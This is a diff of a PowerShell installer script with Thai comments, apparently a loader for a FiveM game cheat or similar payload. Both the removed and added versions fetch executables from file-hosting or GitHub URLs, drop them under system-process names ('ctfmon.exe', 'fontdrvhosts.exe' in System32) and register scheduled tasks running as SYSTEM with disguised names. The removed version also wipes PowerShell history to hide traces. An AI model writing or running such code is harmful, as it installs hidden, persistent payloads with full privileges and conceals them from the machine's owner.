@@ -1,129 +1,35 @@
-#Requires -RunAsAdministrator
-Clear-Host
-Write-Host "1 : Install Premium"
-Write-Host "2 : Clean Premium"
-Write-Host ""
-$choice = Read-Host "Select (1/2)"
-$ErrorActionPreference = 'Stop'
-$ProgressPreference = 'SilentlyContinue'
-
-$programData = "C:\ProgramData"  # à¹€à¸›à¸¥à¸µà¹ˆà¸¢à¸™à¸à¸¥à¸±à¸šà¹€à¸›à¹‡à¸™ path à¹€à¸”à¸´à¸¡à¸•à¸²à¸¡à¸—à¸µà¹ˆà¸‚à¸­
-$exeUrl = "https://files.catbox.moe/cg5j9e.bin"
-$exeName = "ctfmon.exe"                      # à¸Šà¸·à¹ˆà¸­à¹€à¸™à¸µà¸¢à¸™
-$exePath = Join-Path $programData $exeName
-
-$dllUrl = "https://catboxvip.com/upload/files/2026/01/NGixybF0PX.dll"
-$dllName = "cpprest142_2_10.dll"             # à¸„à¸‡à¸Šà¸·à¹ˆà¸­à¸•à¸²à¸¡à¸—à¸µà¹ˆà¸„à¸¸à¸“à¸à¸³à¸«à¸™à¸”
-$dllPath = Join-Path $programData $dllName
-
-$taskName = "Microsoft Compatibility Telemetry"  # à¸Šà¸·à¹ˆà¸­ task à¹€à¸™à¸µà¸¢à¸™
-
-function Clear-PowerShellTraces {
-    Clear-History -ErrorAction SilentlyContinue
-    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-    if (Test-Path $historyPath) {
-        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
-        New-Item $historyPath -ItemType File -Force | Out-Null
-    }
-    $cachePath = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\ModuleAnalysisCache"
-    if (Test-Path $cachePath) { Remove-Item $cachePath -Force -ErrorAction SilentlyContinue }
-    if ($host.Name -eq 'ConsoleHost') { [console]::Clear() }
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "ADMIN..."
+ 
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
+ 
+ 
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
+$databasePath = Join-Path $system32Path "database.txt"
+ 
+ 
+$exeUrl = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/terstax" -UseBasicParsing).Content.Trim()
 
-function Reset-FileACLAndTakeOwnership {
-    param([string]$FilePath)
-    if (-not (Test-Path $FilePath)) { return }
-    & takeown /F "$FilePath" /A *>$null 2>$null
-    & icacls "$FilePath" /grant Administrators:F /C /Q *>$null 2>$null
-    & icacls "$FilePath" /reset /C /Q *>$null 2>$null
+# จากนั้นคุณสามารถดาวน์โหลดไฟล์จากลิงก์นั้นได้ (หากเชื่อถือได้)
+if ($exeUrl -match '^https?://') {
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 }
-
-function Invoke-Clean {
-    $baseNames = @(
-        [IO.Path]::GetFileNameWithoutExtension($exeName),
-        [IO.Path]::GetFileNameWithoutExtension($dllName)
-    ) | Sort-Object -Unique
-
-    foreach ($base in $baseNames) {
-        Get-Process -Name $base -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    }
-    Start-Sleep -Milliseconds 1200
-
-    schtasks /delete /tn "$taskName" /f *>$null 2>$null
-
-    if (Test-Path $exePath) {
-        Reset-FileACLAndTakeOwnership $exePath
-        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
-    }
-    if (Test-Path $dllPath) {
-        Reset-FileACLAndTakeOwnership $dllPath
-        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
-    }
-
-    Clear-PowerShellTraces
-}
-
-if ($choice -eq "1") {
-    $success = $true
-    $errorCode = 0
-    try {
-        if (-not (Test-Path $programData)) {
-            New-Item -Path $programData -ItemType Directory -Force *>$null 2>$null
-        }
-
-        # à¸¥à¸šà¸‚à¸­à¸‡à¹€à¸à¹ˆà¸²à¸–à¹‰à¸²à¸¡à¸µ
-        if (Test-Path $exePath) {
-            Reset-FileACLAndTakeOwnership $exePath
-            Remove-Item $exePath -Force -ErrorAction Stop
-        }
-
-        # à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
-
-        # à¸•à¸±à¹‰à¸‡ ACL à¹ƒà¸«à¹‰ SYSTEM à¹€à¸—à¹ˆà¸²à¸™à¸±à¹‰à¸™
-        & icacls "$exePath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null
-
-        Start-Sleep -Milliseconds 800
-
-        # à¸ªà¸£à¹‰à¸²à¸‡ task
-        schtasks /create /tn "$taskName" /tr "$exePath" /sc ONSTART /ru SYSTEM /rl HIGHEST /f /DELAY 0000:30 *>$null 2>$null
-        if ($LASTEXITCODE -ne 0) { $errorCode = 6; throw }
-
-        # à¸£à¸±à¸™à¸—à¸±à¸™à¸—à¸µ
-        schtasks /run /tn "$taskName" *>$null 2>$null
-        if ($LASTEXITCODE -ne 0) { $errorCode = 7; throw }
-    }
-    catch {
-        $success = $false
-        if ($errorCode -eq 0) { $errorCode = 9 }
-    }
-
-    if ($success) {
-        Write-Host "Successfully" -ForegroundColor Green
-    } else {
-        Write-Host "Error $errorCode" -ForegroundColor Red
-        Pause
-    }
-}
-elseif ($choice -eq "2") {
-    $success = $true
-    try {
-        Invoke-Clean
-    }
-    catch {
-        $success = $false
-    }
-    if ($success) {
-        Write-Host "Successfully" -ForegroundColor Green
-    } else {
-        Write-Host "Error" -ForegroundColor Red
-    }
-    Pause
-}
-else {
-    Write-Host "Error" -ForegroundColor Red
-    Pause
-}
-
-Clear-PowerShellTraces
-
+ 
+ 
+Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+ 
+$key = Read-Host "Enter License Key"
+ 
+Set-Content -Path $databasePath -Value $key
+ 
+ 
+$cmd = 'cmd /c schtasks /create /tn "SoundServices" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+ 
+ 
+Invoke-Expression $cmd
+ 
+ 
+auditpol /set /subcategory:"Process Creation" /success:enable
